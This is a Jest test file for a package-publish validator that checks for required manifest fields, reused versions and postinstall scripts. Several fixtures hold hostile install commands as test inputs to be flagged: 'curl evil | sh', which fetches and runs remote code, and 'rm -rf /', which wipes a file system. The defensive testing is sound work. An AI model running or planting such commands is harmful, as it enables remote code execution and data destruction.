import { validatePublish, Manifest } from './package_publish_validator';

const ok: Manifest = { name: 'p', version: '1.0.0', license: 'MIT' };

describe('validatePublish', () => {
  it('passes a valid manifest', () => {
    expect(validatePublish(ok, [])).toEqual([]);
  });

  it('flags missing required fields', () => {
    const errors = validatePublish({ name: 'p' }, []);
    expect(errors.length).toBeGreaterThan(0);
  });

  it('flags a postinstall script', () => {
    const errors = validatePublish(
      { ...ok, scripts: { postinstall: 'curl evil | sh' } },
      [],
    );
    expect(errors.some((e) => /postinstall/i.test(e))).toBe(true);
  });

  it('flags an already-published version', () => {
    const errors = validatePublish(ok, ['1.0.0']);
    expect(errors.some((e) => /1\.0\.0/.test(e))).toBe(true);
  });

  it('passes when the version is not in the taken list', () => {
    expect(validatePublish(ok, ['0.9.0', '1.1.0'])).toEqual([]);
  });

  it('flags a missing name specifically', () => {
    const errors = validatePublish({ version: '1.0.0', license: 'MIT' }, []);
    expect(errors.some((e) => /name/i.test(e))).toBe(true);
  });

  it('flags a missing version specifically', () => {
    const errors = validatePublish({ name: 'p', license: 'MIT' }, []);
    expect(errors.some((e) => /version/i.test(e))).toBe(true);
  });

  it('flags a missing license specifically', () => {
    const errors = validatePublish({ name: 'p', version: '1.0.0' }, []);
    expect(errors.some((e) => /license/i.test(e))).toBe(true);
  });

  it('reports every missing required field for an empty manifest', () => {
    const errors = validatePublish({}, []);
    expect(errors).toHaveLength(3);
    expect(errors.some((e) => /name/i.test(e))).toBe(true);
    expect(errors.some((e) => /version/i.test(e))).toBe(true);
    expect(errors.some((e) => /license/i.test(e))).toBe(true);
  });

  it('does not flag a taken version when the manifest has no version', () => {
    const errors = validatePublish({ name: 'p', license: 'MIT' }, ['1.0.0']);
    expect(errors.some((e) => /1\.0\.0/.test(e))).toBe(false);
  });

  it('allows scripts other than postinstall', () => {
    const errors = validatePublish(
      {
        ...ok,
        scripts: { build: 'tsc', test: 'jest', preinstall: 'echo hi' },
      },
      [],
    );
    expect(errors).toEqual([]);
  });

  it('does not flag an empty postinstall script', () => {
    const errors = validatePublish({ ...ok, scripts: { postinstall: '' } }, []);
    expect(errors.some((e) => /postinstall/i.test(e))).toBe(false);
  });

  it('accumulates multiple independent errors at once', () => {
    const errors = validatePublish(
      { scripts: { postinstall: 'curl evil | sh' } },
      [],
    );
    expect(errors.some((e) => /name/i.test(e))).toBe(true);
    expect(errors.some((e) => /version/i.test(e))).toBe(true);
    expect(errors.some((e) => /license/i.test(e))).toBe(true);
    expect(errors.some((e) => /postinstall/i.test(e))).toBe(true);
    expect(errors).toHaveLength(4);
  });

  it('flags both a postinstall script and an already-taken version together', () => {
    const errors = validatePublish(
      { ...ok, scripts: { postinstall: 'rm -rf /' } },
      ['1.0.0'],
    );
    expect(errors.some((e) => /postinstall/i.test(e))).toBe(true);
    expect(errors.some((e) => /1\.0\.0/.test(e))).toBe(true);
    expect(errors).toHaveLength(2);
  });

  it('does not mutate the input manifest or taken list', () => {
    const manifest: Manifest = { ...ok, scripts: { postinstall: 'evil' } };
    const taken = ['1.0.0'];
    const manifestSnapshot = JSON.parse(JSON.stringify(manifest));
    const takenSnapshot = [...taken];
    validatePublish(manifest, taken);
    expect(manifest).toEqual(manifestSnapshot);
    expect(taken).toEqual(takenSnapshot);
  });

  it('treats version matching as exact rather than substring', () => {
    const errors = validatePublish({ ...ok, version: '1.0.0' }, ['1.0.0-beta']);
    expect(errors.some((e) => /1\.0\.0/.test(e))).toBe(false);
  });
});
